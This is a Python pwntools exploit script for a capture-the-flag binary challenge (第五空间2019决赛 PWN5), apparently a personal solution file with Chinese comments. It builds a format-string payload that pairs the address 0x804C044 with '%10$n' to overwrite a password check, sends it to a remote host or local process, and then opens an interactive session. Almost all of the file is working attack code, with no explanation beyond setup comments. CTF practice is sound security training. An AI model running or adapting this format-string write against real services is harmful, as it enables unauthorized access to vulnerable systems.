'''
@Author       : 白银
@Date         : 2023-03-13 15:06:09
@LastEditors  : 白银
@LastEditTime : 2023-03-13 19:21:56
@FilePath     : /pwn/第五空间2019决赛PWN5.py
@Description  : 格式字符串  https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5
@Attention    : 看不懂
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *


def set_pwn(set_arch, pwnfile, if_remote, remote_addr, remote_port):
    # set_arch = 0

    if set_arch == 0:
        context(log_level='debug', arch='amd64', os='linux')
    elif set_arch == 1:
        context(log_level='debug', arch='arm64', os='linux')
    elif set_arch == 2:
        context(log_level='debug', arch='i386', os='linux')

    # pwnfile = './pwn1'
    elf = ELF(pwnfile)

    # if_remote = 0  # 0为远程

    if if_remote == 1:
        # io = remote("192.168.61.139", 8888)
        io = remote(remote_addr, remote_port)
        # io = remote("node4.buuoj.cn", 26852)
        # libc = ELF('/home/jack/Desktop/libc.so.6')

        if set_arch == 0 or set_arch == 1:
            libc = ELF('/home/jack/Desktop/x64_libc.so.6')
        else:
            libc = ELF('/home/jack/Desktop/x86_libc.so.6')
    else:
        io = process(pwnfile)

        # 本地用
        # elf = ELF(pwnfile)
        libc = elf.libc
        rop = ROP(pwnfile)

        # 本地调试用
        gdb.attach(io)
        pause()

    io.recvuntil('name:')
    passwd = 0x804C044
    payload = flat([passwd, '%10$n'])
    print(payload)
    io.sendline(payload)
    # io.sendline(str(4))

    # delimiter = '>'

    # if if_remote == 1:
    #     io.sendline(payload)  # 远程用
    # else:
    #     # io.sendlineafter(delimiter, payload)  # 本地用
    #     io.sendline(payload)

    io.interactive()


if __name__ == '__main__':
    set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
    pwnfile = './pwn'  # pwnfile， str，二进制文件
    if_remote = 1  # if_remote，int，1→远程，别的数字→本地
    remote_addr = "192.168.61.139"  # remote_addr，str，远程地址
    remote_port = 8888  # remote_port，int， 远程端口
    # remote_addr = "node4.buuoj.cn"  # remote_addr，str，远程地址
    # remote_port = 29423  # remote_port，int， 远程端口
    # 打本地，if_remote改别的数字就可以，最后两个参数随便改
    # set_arch, pwnfile, if_remote, remote_addr, remote_port
    set_pwn(set_arch, pwnfile, if_remote, remote_addr, remote_port)